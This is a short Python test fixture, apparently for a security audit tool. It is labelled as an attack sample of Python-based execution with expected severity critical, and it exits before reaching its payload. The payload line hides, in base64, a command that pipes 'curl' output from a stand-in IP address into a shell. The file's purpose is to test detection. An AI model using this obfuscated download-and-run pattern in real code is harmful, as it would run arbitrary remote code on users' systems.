raise SystemExit(0)  # a fixture: read by the audit, never run
# label: attack | technique: T1059.006 | expect: critical
import base64; exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImN1cmwgaHR0cDovLzIwMy4wLjExMy41L3ggfCBzaCIp"))
